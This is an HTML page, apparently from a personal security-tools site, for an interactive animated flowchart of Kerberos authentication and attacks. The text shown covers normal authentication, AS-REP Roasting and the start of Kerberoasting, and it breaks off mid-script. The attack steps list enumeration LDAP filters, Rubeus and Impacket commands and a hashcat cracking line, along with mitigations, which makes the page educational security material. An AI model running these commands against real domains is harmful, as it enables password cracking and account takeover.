<!DOCTYPE html>
<html>
<head>
	<title>AD Kerberos Flowchart - Interactive Authentication & Attack Visualizer</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Interactive Kerberos authentication flowchart with animated packet flows. Learn Kerberos, Kerberoasting, Golden Ticket, Silver Ticket, S4U2Self, S4U2Proxy, Constrained Delegation, RBCD attacks.">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
	<style>
		* { box-sizing: border-box; }
		body {
			font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
			background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 50%, #0f0f23 100%);
			background-attachment: fixed;
			margin: 0;
			padding: 0;
			line-height: 1.6;
			color: #e0e0e0;
			min-height: 100vh;
		}

		/* Animated background grid */
		body::before {
			content: '';
			position: fixed;
			top: 0;
			left: 0;
			width: 100%;
			height: 100%;
			background-image:
				linear-gradient(rgba(74, 158, 255, 0.03) 1px, transparent 1px),
				linear-gradient(90deg, rgba(74, 158, 255, 0.03) 1px, transparent 1px);
			background-size: 50px 50px;
			pointer-events: none;
			z-index: -1;
		}

		.navbar {
			background: rgba(26, 26, 46, 0.95) !important;
			backdrop-filter: blur(10px);
			padding: 15px 0;
			box-shadow: 0 2px 20px rgba(0,0,0,0.5);
		}
		.navbar-brand { color: #fff !important; font-size: 22px; font-weight: 600; }
		.nav-link { color: rgba(255,255,255,0.9) !important; font-size: 16px; margin-left: 20px; transition: color 0.3s; }
		.nav-link:hover { color: #4a9eff !important; }

		.hero-section {
			background: linear-gradient(135deg, #1a1a2e 0%, #0f3460 50%, #1a1a2e 100%);
			color: #fff;
			padding: 40px 0;
			text-align: center;
			border-bottom: 3px solid #e94560;
			position: relative;
			overflow: hidden;
		}
		.hero-section::before {
			content: '';
			position: absolute;
			top: -50%;
			left: -50%;
			width: 200%;
			height: 200%;
			background: radial-gradient(circle, rgba(74,158,255,0.1) 0%, transparent 50%);
			animation: heroGlow 10s ease-in-out infinite;
		}
		@keyframes heroGlow {
			0%, 100% { transform: translate(0, 0); }
			50% { transform: translate(10%, 10%); }
		}
		.hero-section h1 { font-size: 36px; font-weight: 700; margin-bottom: 10px; position: relative; }
		.hero-section p { font-size: 16px; opacity: 0.9; position: relative; }

		.main-content { padding: 30px 0; padding-bottom: 100px; }

		/* Category Tabs */
		.category-tabs {
			display: flex;
			justify-content: center;
			gap: 10px;
			margin-bottom: 20px;
			flex-wrap: wrap;
		}
		.category-tab {
			padding: 10px 20px;
			background: rgba(26, 26, 46, 0.8);
			border: 2px solid #333;
			color: #888;
			border-radius: 25px;
			cursor: pointer;
			font-weight: 600;
			transition: all 0.3s;
		}
		.category-tab:hover { border-color: #4a9eff; color: #4a9eff; }
		.category-tab.active {
			background: linear-gradient(135deg, #4a9eff 0%, #00d2ff 100%);
			border-color: transparent;
			color: #fff;
		}

		/* Topic Navigation */
		.topic-nav {
			display: flex;
			flex-wrap: wrap;
			gap: 8px;
			justify-content: center;
			margin-bottom: 25px;
			padding: 15px;
			background: rgba(0,0,0,0.3);
			border-radius: 15px;
		}
		.topic-btn {
			padding: 10px 18px;
			border: 2px solid #4a9eff;
			background: transparent;
			color: #4a9eff;
			border-radius: 25px;
			cursor: pointer;
			font-weight: 600;
			font-size: 13px;
			transition: all 0.3s;
			position: relative;
			overflow: hidden;
		}
		.topic-btn::before {
			content: '';
			position: absolute;
			top: 0;
			left: -100%;
			width: 100%;
			height: 100%;
			background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
			transition: left 0.5s;
		}
		.topic-btn:hover::before { left: 100%; }
		.topic-btn:hover, .topic-btn.active {
			background: linear-gradient(135deg, #4a9eff 0%, #00d2ff 100%);
			color: #fff;
			transform: translateY(-2px);
			box-shadow: 0 5px 20px rgba(74, 158, 255, 0.4);
		}
		.topic-btn.attack { border-color: #e94560; color: #e94560; }
		.topic-btn.attack:hover, .topic-btn.attack.active {
			background: linear-gradient(135deg, #e94560 0%, #ff6b6b 100%);
			color: #fff;
			box-shadow: 0 5px 20px rgba(233, 69, 96, 0.4);
		}
		.topic-btn.delegation { border-color: #9b59b6; color: #9b59b6; }
		.topic-btn.delegation:hover, .topic-btn.delegation.active {
			background: linear-gradient(135deg, #9b59b6 0%, #8e44ad 100%);
			color: #fff;
			box-shadow: 0 5px 20px rgba(155, 89, 182, 0.4);
		}

		/* Flowchart Container */
		.flowchart-container {
			background: linear-gradient(180deg, rgba(15,15,35,0.9) 0%, rgba(26,26,46,0.9) 100%);
			border-radius: 20px;
			padding: 30px;
			margin-bottom: 20px;
			border: 1px solid rgba(74, 158, 255, 0.2);
			min-height: 450px;
			position: relative;
			overflow: hidden;
			box-shadow: 0 10px 40px rgba(0,0,0,0.5), inset 0 0 100px rgba(74, 158, 255, 0.02);
		}

		/* Animated background particles */
		.particle {
			position: absolute;
			width: 4px;
			height: 4px;
			background: rgba(74, 158, 255, 0.5);
			border-radius: 50%;
			pointer-events: none;
			animation: float 3s ease-in-out infinite;
		}
		@keyframes float {
			0%, 100% { transform: translateY(0) scale(1); opacity: 0.5; }
			50% { transform: translateY(-20px) scale(1.5); opacity: 1; }
		}

		/* Entities */
		.entity {
			position: absolute;
			text-align: center;
			z-index: 10;
			transition: all 0.3s ease;
		}
		.entity-icon {
			width: 90px;
			height: 90px;
			border-radius: 50%;
			display: flex;
			align-items: center;
			justify-content: center;
			margin: 0 auto 10px;
			font-size: 36px;
			color: #fff;
			box-shadow: 0 5px 30px rgba(0,0,0,0.4);
			transition: all 0.3s;
			position: relative;
		}
		.entity-icon::before {
			content: '';
			position: absolute;
			top: -3px;
			left: -3px;
			right: -3px;
			bottom: -3px;
			border-radius: 50%;
			border: 2px solid transparent;
			transition: all 0.3s;
		}
		.entity-icon.client { background: linear-gradient(135deg, #4a9eff 0%, #00d2ff 100%); }
		.entity-icon.kdc { background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%); }
		.entity-icon.krbtgt { background: linear-gradient(135deg, #9b59b6 0%, #8e44ad 100%); }
		.entity-icon.service { background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%); }
		.entity-icon.service2 { background: linear-gradient(135deg, #17a2b8 0%, #138496 100%); }
		.entity-icon.attacker { background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); }
		.entity-icon.dc { background: linear-gradient(135deg, #e67e22 0%, #d35400 100%); }
		.entity-icon.database { background: linear-gradient(135deg, #3498db 0%, #2980b9 100%); }

		.entity-label {
			font-weight: 700;
			font-size: 13px;
			color: #fff;
			text-shadow: 0 2px 4px rgba(0,0,0,0.8);
		}
		.entity-sublabel {
			font-size: 10px;
			color: #aaa;
			max-width: 100px;
			margin: 0 auto;
		}

		/* Active entity animation */
		.entity-icon.active {
			animation: activePulse 1.5s ease-in-out infinite;
		}
		.entity-icon.active::before {
			border-color: #4a9eff;
			animation: ringPulse 1.5s ease-in-out infinite;
		}
		@keyframes activePulse {
			0%, 100% { transform: scale(1); }
			50% { transform: scale(1.1); }
		}
		@keyframes ringPulse {
			0%, 100% { transform: scale(1); opacity: 1; }
			50% { transform: scale(1.3); opacity: 0; }
		}

		/* SVG Animations */
		#flowSvg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 5; }

		.connection-line {
			fill: none;
			stroke: rgba(74, 158, 255, 0.3);
			stroke-width: 2;
			stroke-dasharray: 8 4;
		}
		.animated-path {
			fill: none;
			stroke-width: 3;
			stroke-linecap: round;
			opacity: 0;
		}
		.animated-path.active {
			opacity: 1;
			stroke-dasharray: 1000;
			stroke-dashoffset: 1000;
			animation: drawPath 1.5s ease forwards;
		}
		@keyframes drawPath {
			to { stroke-dashoffset: 0; }
		}

		/* Packet animation */
		.packet {
			position: absolute;
			padding: 6px 12px;
			border-radius: 15px;
			font-size: 10px;
			font-weight: 700;
			white-space: nowrap;
			z-index: 25;
			pointer-events: none;
			box-shadow: 0 4px 20px rgba(0,0,0,0.4);
			display: flex;
			align-items: center;
			gap: 5px;
		}
		.packet i { font-size: 10px; }
		.packet.as-req { background: linear-gradient(135deg, #4a9eff, #00d2ff); color: #fff; }
		.packet.as-rep { background: linear-gradient(135deg, #f39c12, #e67e22); color: #fff; }
		.packet.tgs-req { background: linear-gradient(135deg, #9b59b6, #8e44ad); color: #fff; }
		.packet.tgs-rep { background: linear-gradient(135deg, #27ae60, #2ecc71); color: #fff; }
		.packet.ap-req { background: linear-gradient(135deg, #00d2ff, #4a9eff); color: #fff; }
		.packet.ap-rep { background: linear-gradient(135deg, #2ecc71, #27ae60); color: #fff; }
		.packet.malicious { background: linear-gradient(135deg, #e74c3c, #c0392b); color: #fff; }
		.packet.ticket { background: linear-gradient(135deg, #f1c40f, #f39c12); color: #000; }
		.packet.s4u { background: linear-gradient(135deg, #9b59b6, #e74c3c); color: #fff; }

		/* Packet trail effect */
		.packet-trail {
			position: absolute;
			width: 8px;
			height: 8px;
			border-radius: 50%;
			pointer-events: none;
			z-index: 24;
		}

		/* Controls */
		.controls-panel {
			background: rgba(26, 26, 46, 0.9);
			border-radius: 15px;
			padding: 15px 25px;
			display: flex;
			align-items: center;
			justify-content: center;
			gap: 20px;
			flex-wrap: wrap;
			margin-bottom: 20px;
			border: 1px solid rgba(74, 158, 255, 0.2);
		}
		.control-btn {
			padding: 12px 28px;
			border: none;
			border-radius: 25px;
			cursor: pointer;
			font-weight: 600;
			font-size: 14px;
			transition: all 0.3s;
			display: flex;
			align-items: center;
			gap: 8px;
		}
		.control-btn.play { background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%); color: #fff; }
		.control-btn.pause { background: linear-gradient(135deg, #e67e22 0%, #f39c12 100%); color: #fff; }
		.control-btn.reset { background: linear-gradient(135deg, #6c757d 0%, #5a6268 100%); color: #fff; }
		.control-btn.step { background: linear-gradient(135deg, #4a9eff 0%, #00d2ff 100%); color: #fff; }
		.control-btn:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(0,0,0,0.3); }
		.control-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }

		.speed-control {
			display: flex;
			align-items: center;
			gap: 10px;
		}
		.speed-control label { color: #aaa; font-size: 13px; }
		.speed-control input[type="range"] { width: 100px; accent-color: #4a9eff; }
		.speed-label {
			background: #4a9eff;
			color: #fff;
			padding: 3px 10px;
			border-radius: 10px;
			font-size: 12px;
			font-weight: 600;
		}

		/* Step Progress */
		.step-progress {
			display: flex;
			align-items: center;
			gap: 5px;
		}
		.step-progress span { color: #aaa; font-size: 13px; }
		.step-progress .current { color: #4a9eff; font-weight: 700; }

		/* Step Indicator */
		.step-indicator {
			position: fixed;
			bottom: 20px;
			left: 50%;
			transform: translateX(-50%);
			display: flex;
			gap: 8px;
			z-index: 100;
			background: rgba(26, 26, 46, 0.98);
			padding: 12px 20px;
			border-radius: 30px;
			box-shadow: 0 5px 30px rgba(0,0,0,0.5);
			border: 1px solid rgba(74, 158, 255, 0.3);
			max-width: 90vw;
			overflow-x: auto;
		}
		.step-dot {
			width: 14px;
			height: 14px;
			border-radius: 50%;
			background: #333;
			transition: all 0.3s;
			cursor: pointer;
			border: 2px solid transparent;
			flex-shrink: 0;
		}
		.step-dot:hover { transform: scale(1.2); background: #555; }
		.step-dot.active { background: #4a9eff; border-color: #fff; transform: scale(1.3); box-shadow: 0 0 15px #4a9eff; }
		.step-dot.completed { background: #27ae60; }
		.step-dot.attack.active { background: #e94560; box-shadow: 0 0 15px #e94560; }

		/* Explanation Panel */
		.explanation-panel {
			background: linear-gradient(135deg, rgba(26,26,46,0.95) 0%, rgba(22,33,62,0.95) 100%);
			border-radius: 15px;
			padding: 25px;
			border: 1px solid rgba(74, 158, 255, 0.2);
			box-shadow: 0 10px 40px rgba(0,0,0,0.3);
		}
		.explanation-panel h3 {
			color: #4a9eff;
			margin-bottom: 15px;
			font-size: 18px;
			display: flex;
			align-items: center;
			gap: 10px;
		}
		.step-number {
			background: linear-gradient(135deg, #4a9eff, #00d2ff);
			color: #fff;
			width: 30px;
			height: 30px;
			border-radius: 50%;
			display: flex;
			align-items: center;
			justify-content: center;
			font-size: 14px;
			font-weight: 700;
		}
		.explanation-panel .step-title {
			color: #f39c12;
			font-weight: 700;
			font-size: 20px;
			margin-bottom: 10px;
		}
		.explanation-panel .step-desc {
			color: #ccc;
			font-size: 15px;
			line-height: 1.8;
		}
		.explanation-panel code {
			background: rgba(0,0,0,0.4);
			color: #4a9eff;
			padding: 2px 8px;
			border-radius: 4px;
			font-size: 12px;
			font-family: 'Consolas', 'Monaco', monospace;
		}
		.tech-detail {
			background: rgba(0,0,0,0.3);
			border-left: 4px solid #4a9eff;
			padding: 15px;
			margin: 15px 0;
			border-radius: 0 10px 10px 0;
			font-size: 14px;
		}
		.warning-box {
			background: rgba(231, 76, 60, 0.15);
			border-left: 4px solid #e74c3c;
			padding: 15px;
			margin: 15px 0;
			border-radius: 0 10px 10px 0;
		}
		.warning-box i { color: #e74c3c; margin-right: 8px; }
		.success-box {
			background: rgba(39, 174, 96, 0.15);
			border-left: 4px solid #27ae60;
			padding: 15px;
			margin: 15px 0;
			border-radius: 0 10px 10px 0;
		}
		.success-box i { color: #27ae60; margin-right: 8px; }

		/* Packet Contents */
		.packet-contents {
			background: rgba(0,0,0,0.5);
			border-radius: 10px;
			padding: 15px;
			margin: 15px 0;
			font-family: 'Consolas', 'Monaco', monospace;
			font-size: 11px;
			border: 1px solid rgba(74, 158, 255, 0.2);
			overflow-x: auto;
		}
		.packet-contents .field {
			display: flex;
			padding: 3px 0;
			border-bottom: 1px solid rgba(255,255,255,0.05);
		}
		.packet-contents .field:last-child { border-bottom: none; }
		.packet-contents .field-name { color: #e74c3c; min-width: 200px; }
		.packet-contents .field-value { color: #2ecc71; }
		.packet-contents .field-value.encrypted { color: #f39c12; font-style: italic; }

		/* Legend */
		.legend {
			display: flex;
			flex-wrap: wrap;
			gap: 12px;
			justify-content: center;
			margin-bottom: 15px;
			padding: 10px;
			background: rgba(0,0,0,0.2);
			border-radius: 10px;
		}
		.legend-item {
			display: flex;
			align-items: center;
			gap: 6px;
			font-size: 11px;
			color: #aaa;
		}
		.legend-color {
			width: 18px;
			height: 18px;
			border-radius: 50%;
			box-shadow: 0 2px 8px rgba(0,0,0,0.3);
		}

		footer {
			background: rgba(26, 26, 46, 0.95);
			color: #fff;
			padding: 25px 0;
			text-align: center;
			margin-top: 50px;
		}
		footer p { margin: 0; opacity: 0.7; font-size: 14px; }

		/* Responsive */
		@media (max-width: 768px) {
			.flowchart-container { min-height: 350px; padding: 15px; }
			.entity-icon { width: 60px; height: 60px; font-size: 24px; }
			.entity-label { font-size: 10px; }
			.topic-btn { padding: 8px 12px; font-size: 11px; }
			.controls-panel { padding: 10px 15px; gap: 10px; }
			.control-btn { padding: 8px 16px; font-size: 12px; }
		}
	</style>
</head>
<body>
	<nav class="navbar navbar-expand-lg navbar-dark">
		<div class="container">
			<a class="navbar-brand" href="../index.html">Shravan Kumar Sheri</a>
			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav">
				<span class="navbar-toggler-icon"></span>
			</button>
			<div class="collapse navbar-collapse" id="navbarNav">
				<ul class="navbar-nav ml-auto">
					<li class="nav-item"><a class="nav-link" href="../index.html">Home</a></li>
					<li class="nav-item"><a class="nav-link" href="../blog.html">Blog</a></li>
					<li class="nav-item active"><a class="nav-link" href="../tools.html">Tools</a></li>
				</ul>
			</div>
		</div>
	</nav>

	<section class="hero-section">
		<div class="container">
			<h1><i class="fas fa-project-diagram"></i> AD Kerberos Flowchart</h1>
			<p>Interactive visualization of Kerberos authentication and attacks with animated packet flows</p>
		</div>
	</section>

	<section class="main-content">
		<div class="container-fluid" style="max-width: 1400px;">

			<!-- Category Tabs -->
			<div class="category-tabs">
				<button class="category-tab active" data-category="auth">Authentication</button>
				<button class="category-tab" data-category="roasting">Roasting Attacks</button>
				<button class="category-tab" data-category="tickets">Ticket Attacks</button>
				<button class="category-tab" data-category="delegation">Delegation Attacks</button>
			</div>

			<!-- Topic Navigation -->
			<div class="topic-nav" id="topicNav">
				<!-- Populated by JS -->
			</div>

			<!-- Legend -->
			<div class="legend">
				<div class="legend-item"><div class="legend-color" style="background: linear-gradient(135deg, #4a9eff, #00d2ff);"></div><span>Client/User</span></div>
				<div class="legend-item"><div class="legend-color" style="background: linear-gradient(135deg, #f39c12, #e67e22);"></div><span>KDC/DC</span></div>
				<div class="legend-item"><div class="legend-color" style="background: linear-gradient(135deg, #9b59b6, #8e44ad);"></div><span>KRBTGT</span></div>
				<div class="legend-item"><div class="legend-color" style="background: linear-gradient(135deg, #27ae60, #2ecc71);"></div><span>Service</span></div>
				<div class="legend-item"><div class="legend-color" style="background: linear-gradient(135deg, #e74c3c, #c0392b);"></div><span>Attacker</span></div>
			</div>

			<!-- Controls -->
			<div class="controls-panel">
				<button class="control-btn play" id="playBtn"><i class="fas fa-play"></i> Play</button>
				<button class="control-btn pause" id="pauseBtn" style="display:none;"><i class="fas fa-pause"></i> Pause</button>
				<button class="control-btn step" id="stepBtn"><i class="fas fa-step-forward"></i> Step</button>
				<button class="control-btn reset" id="resetBtn"><i class="fas fa-redo"></i> Reset</button>
				<div class="speed-control">
					<label><i class="fas fa-tachometer-alt"></i></label>
					<input type="range" min="0.5" max="3" step="0.5" value="1" id="speedControl">
					<span class="speed-label" id="speedLabel">1x</span>
				</div>
				<div class="step-progress">
					<span>Step:</span>
					<span class="current" id="stepCurrent">1</span>
					<span>/</span>
					<span id="stepTotal">12</span>
				</div>
			</div>

			<!-- Flowchart -->
			<div class="flowchart-container" id="flowchartContainer">
				<svg id="flowSvg">
					<defs>
						<marker id="arrow-blue" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#4a9eff"/></marker>
						<marker id="arrow-orange" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#f39c12"/></marker>
						<marker id="arrow-green" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#27ae60"/></marker>
						<marker id="arrow-red" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#e74c3c"/></marker>
						<marker id="arrow-purple" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#9b59b6"/></marker>
						<filter id="glow">
							<feGaussianBlur stdDeviation="3" result="coloredBlur"/>
							<feMerge><feMergeNode in="coloredBlur"/><feMergeNode in="SourceGraphic"/></feMerge>
						</filter>
					</defs>
				</svg>
			</div>

			<!-- Step Indicator -->
			<div class="step-indicator" id="stepIndicator"></div>

			<!-- Explanation -->
			<div class="explanation-panel" id="explanationPanel">
				<h3><i class="fas fa-info-circle"></i> Step Details</h3>
				<div id="stepContent">
					<p class="step-desc">Select a topic and click "Play" or "Step" to see the animated flow.</p>
				</div>
			</div>
		</div>
	</section>

	<footer>
		<div class="container">
			<p>&copy; 2025 Shravan Kumar Sheri - Security Tools</p>
		</div>
	</footer>

	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
	<script>
	// ==================== TOPIC DATA ====================
	const topicCategories = {
		auth: [
			{ id: 'kerberos-auth', name: 'Kerberos Authentication', icon: 'fa-key', class: '' }
		],
		roasting: [
			{ id: 'asrep-roast', name: 'AS-REP Roasting', icon: 'fa-fire', class: 'attack' },
			{ id: 'kerberoasting', name: 'Kerberoasting', icon: 'fa-utensils', class: 'attack' }
		],
		tickets: [
			{ id: 'golden-ticket', name: 'Golden Ticket', icon: 'fa-crown', class: 'attack' },
			{ id: 'silver-ticket', name: 'Silver Ticket', icon: 'fa-medal', class: 'attack' },
			{ id: 'pass-the-ticket', name: 'Pass-the-Ticket', icon: 'fa-ticket-alt', class: 'attack' },
			{ id: 'overpass-hash', name: 'Overpass-the-Hash', icon: 'fa-hashtag', class: 'attack' }
		],
		delegation: [
			{ id: 'unconstrained-deleg', name: 'Unconstrained Delegation', icon: 'fa-unlock', class: 'delegation' },
			{ id: 'constrained-deleg', name: 'Constrained Delegation', icon: 'fa-lock', class: 'delegation' },
			{ id: 's4u2self', name: 'S4U2Self Attack', icon: 'fa-user-secret', class: 'delegation' },
			{ id: 's4u2proxy', name: 'S4U2Proxy Attack', icon: 'fa-exchange-alt', class: 'delegation' },
			{ id: 'rbcd', name: 'Resource-Based Constrained Delegation', icon: 'fa-project-diagram', class: 'delegation' }
		]
	};

	const topics = {
		'kerberos-auth': {
			title: 'Kerberos Authentication',
			entities: [
				{ id: 'client', type: 'client', label: 'Client', sublabel: 'User Workstation', x: 8, y: 45 },
				{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 50, y: 15 },
				{ id: 'krbtgt', type: 'krbtgt', label: 'KRBTGT', sublabel: 'TGT Encryption Key', x: 50, y: 75 },
				{ id: 'service', type: 'service', label: 'Service', sublabel: 'Target Server', x: 88, y: 45 }
			],
			steps: [
				{
					title: '1. User Initiates Authentication',
					desc: 'User enters username and password. Client computes NT hash: <code>MD4(UTF-16LE(password))</code>. This hash NEVER leaves the client.',
					active: 'client',
					tech: `<b>Local Operations:</b><br>• User enters credentials<br>• NT Hash computed from password<br>• Timestamp encrypted with NT hash for pre-auth`
				},
				{
					title: '2. AS-REQ → KDC',
					desc: 'Client sends Authentication Service Request with encrypted timestamp (pre-authentication) to prove password knowledge.',
					active: 'client',
					anim: { from: 'client', to: 'kdc', label: 'AS-REQ', type: 'as-req' },
					packet: { 'msg-type': 'KRB_AS_REQ (10)', 'padata': '{timestamp encrypted with user hash}', 'cname': 'user@DOMAIN', 'sname': 'krbtgt/DOMAIN' }
				},
				{
					title: '3. KDC Validates User',
					desc: 'KDC retrieves user\'s NT hash from AD, decrypts timestamp. If valid and within 5-min skew, user is authenticated.',
					active: 'kdc',
					tech: `<b>Validation:</b><br>• Lookup user in AD (ntds.dit)<br>• Decrypt timestamp with stored hash<br>• Verify timestamp freshness (±5 min)`
				},
				{
					title: '4. AS-REP ← KDC (TGT)',
					desc: 'KDC returns TGT encrypted with KRBTGT hash (only KDC can read), plus session key encrypted with user\'s hash.',
					active: 'kdc',
					anim: { from: 'kdc', to: 'client', label: 'AS-REP + TGT', type: 'as-rep' },
					packet: { 'ticket (TGT)': '{Encrypted with KRBTGT hash}', '→ PAC': 'User SID, Groups, Privileges', 'enc-part': '{Encrypted with user hash}', '→ session-key': 'For TGS communication' }
				},
				{
					title: '5. Client Stores TGT',
					desc: 'Client decrypts session key using password hash. TGT stored in memory (LSASS on Windows). Client cannot decrypt TGT itself.',
					active: 'client',
					tech: `<b>Storage:</b><br>• Windows: LSASS memory<br>• Linux: /tmp/krb5cc_* or KEYRING<br>• TGT valid ~10 hours by default`
				},
				{
					title: '6. TGS-REQ → KDC',
					desc: 'To access a service, client sends TGS-REQ with TGT and authenticator. Requests ticket for specific SPN.',
					active: 'client',
					anim: { from: 'client', to: 'kdc', label: 'TGS-REQ', type: 'tgs-req' },
					packet: { 'msg-type': 'KRB_TGS_REQ (12)', 'ticket': '{TGT from AS-REP}', 'authenticator': '{Encrypted with session key}', 'sname': 'HTTP/server.domain.com' }
				},
				{
					title: '7. KDC Creates Service Ticket',
					desc: 'KDC decrypts TGT with KRBTGT hash, validates authenticator, creates service ticket encrypted with service account\'s hash.',
					active: 'kdc',
					tech: `<b>Processing:</b><br>• Decrypt TGT → extract session key<br>• Decrypt authenticator → verify timestamp<br>• Copy PAC to service ticket<br>• Encrypt with service account hash`
				},
				{
					title: '8. TGS-REP ← KDC',
					desc: 'KDC returns service ticket. Client cannot decrypt it (only the service can). New session key for service communication.',
					active: 'kdc',
					anim: { from: 'kdc', to: 'client', label: 'TGS-REP', type: 'tgs-rep' },
					packet: { 'ticket': '{Encrypted with SERVICE hash}', '→ PAC': 'Copied from TGT', 'enc-part': '{Encrypted with TGS session key}', '→ service-session-key': 'For AP-REQ' }
				},
				{
					title: '9. AP-REQ → Service',
					desc: 'Client presents service ticket directly to the target service along with fresh authenticator.',
					active: 'client',
					anim: { from: 'client', to: 'service', label: 'AP-REQ', type: 'ap-req' },
					packet: { 'msg-type': 'KRB_AP_REQ (14)', 'ticket': '{Service ticket}', 'authenticator': '{Encrypted with service session key}' }
				},
				{
					title: '10. Service Validates Ticket',
					desc: 'Service decrypts ticket with its own hash, extracts session key, decrypts authenticator. PAC reveals user\'s identity and groups.',
					active: 'service',
					tech: `<b>Authorization:</b><br>• Decrypt ticket with service hash<br>• Extract and validate PAC<br>• Check user groups for permissions<br>• Grant/deny access`
				},
				{
					title: '11. AP-REP ← Service (Mutual Auth)',
					desc: 'If mutual authentication requested, service proves its identity by returning encrypted timestamp.',
					active: 'service',
					anim: { from: 'service', to: 'client', label: 'AP-REP', type: 'ap-rep' }
				},
				{
					title: '12. Session Established ✓',
					desc: 'Authentication complete! User can access the service. All communication can be encrypted with session key.',
					active: 'service',
					success: true,
					tech: `<b>Key Points:</b><br>✓ Password never sent over network<br>✓ Tickets have limited lifetime<br>✓ TGT enables Single Sign-On<br>✓ Service validates via PAC`
				}
			]
		},

		'asrep-roast': {
			title: 'AS-REP Roasting Attack',
			entities: [
				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Any Network Access', x: 10, y: 45 },
				{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 55, y: 45 },
				{ id: 'victim', type: 'client', label: 'Victim', sublabel: 'No Pre-Auth Required', x: 85, y: 15 }
			],
			steps: [
				{
					title: 'Vulnerability: Pre-Auth Disabled',
					desc: 'Some accounts have <code>DONT_REQUIRE_PREAUTH</code> flag set. Anyone can request AS-REP without proving identity!',
					active: 'victim',
					warning: 'LDAP: <code>(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</code>'
				},
				{
					title: '1. Enumerate Vulnerable Users',
					desc: 'Attacker queries AD for accounts without pre-auth. Can be done with any domain user or sometimes anonymously.',
					active: 'attacker',
					tech: `<b>Tools:</b><br>• <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}</code><br>• <code>Rubeus.exe asreproast /user:all</code><br>• <code>GetNPUsers.py domain/user</code>`
				},
				{
					title: '2. AS-REQ Without Pre-Auth',
					desc: 'Attacker sends AS-REQ for victim user WITHOUT encrypted timestamp. KDC accepts because pre-auth is disabled.',
					active: 'attacker',
					anim: { from: 'attacker', to: 'kdc', label: 'AS-REQ (no pre-auth)', type: 'malicious' },
					packet: { 'padata': '[ EMPTY - No pre-auth! ]', 'cname': 'victim@DOMAIN', 'etype': '[23] ← RC4 preferred' }
				},
				{
					title: '3. KDC Returns AS-REP',
					desc: 'KDC returns encrypted data without verifying requester! The enc-part is encrypted with victim\'s password hash.',
					active: 'kdc',
					anim: { from: 'kdc', to: 'attacker', label: 'AS-REP (crackable!)', type: 'as-rep' },
					packet: { 'enc-part': '{ENCRYPTED WITH VICTIM PASSWORD}', '→ This is crackable!': '', 'Contains': 'Session key, nonce, timestamps' }
				},
				{
					title: '4. Extract Hash',
					desc: 'Attacker extracts the encrypted portion and formats it for cracking tools.',
					active: 'attacker',
					tech: `<b>Hash Format:</b><br><code>$krb5asrep$23$victim@DOMAIN:...</code><br><br><b>Hashcat mode:</b> 18200`
				},
				{
					title: '5. Offline Cracking',
					desc: 'GPU-accelerated password cracking. No lockouts, no detection, unlimited attempts!',
					active: 'attacker',
					tech: `<b>Cracking:</b><br><code>hashcat -m 18200 hash.txt wordlist.txt</code><br><br><b>Speed:</b> ~2.5 billion/sec (RTX 3080, RC4)`,
					warning: 'Weak passwords crack in seconds!'
				},
				{
					title: '6. Account Compromised!',
					desc: 'Password obtained. Attacker can now authenticate as victim and access all their resources.',
					active: 'attacker',
					warning: 'Mitigations: Enable pre-auth, use 25+ char passwords, disable RC4, monitor Event ID 4768 without pre-auth'
				}
			]
		},

		'kerberoasting': {
			title: 'Kerberoasting Attack',
			entities: [
				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Domain User', x: 10, y: 45 },
				{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 50, y: 20 },
				{ id: 'service', type: 'service', label: 'SPN Account', sublabel: 'Service Account', x: 85, y: 45 }
			],
			steps: [
				{
					title: 'Target: SPN-Enabled Accounts',
					desc: 'Any domain user can request service tickets for any SPN. Service tickets are encrypted with the service account\'s hash.',
					active: 'service',
					tech: `<b>Why it works:</b><br>• No authorization check for ticket requests<br>• Service accounts often have weak passwords<br>• Passwords rarely changed`
				},
				{
					title: '1. Find Kerberoastable Accounts',
					desc: 'Query AD for user accounts with SPNs registered (excluding krbtgt).',
					active: 'attacker',
					tech: `<b>LDAP:</b> <code>(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))</code><br><br><b>Tools:</b> Rubeus, GetUserSPNs.py, BloodHound`
				},
				{
					title: '2. Authenticate (Get TGT)',
					desc: 'Attacker authenticates normally with compromised domain credentials to get TGT.',
					active: 'attacker',
					anim: { from: 'attacker', to: 'kdc', label: 'AS-REQ', type: 'as-req' }
				},
				{
					title: '3. Receive TGT',
					desc: 'Normal TGT received. This allows requesting service tickets.',
					active: 'kdc',
					anim: { from: 'kdc', to: 'attacker', label: 'AS-REP', type: 'as-rep' }
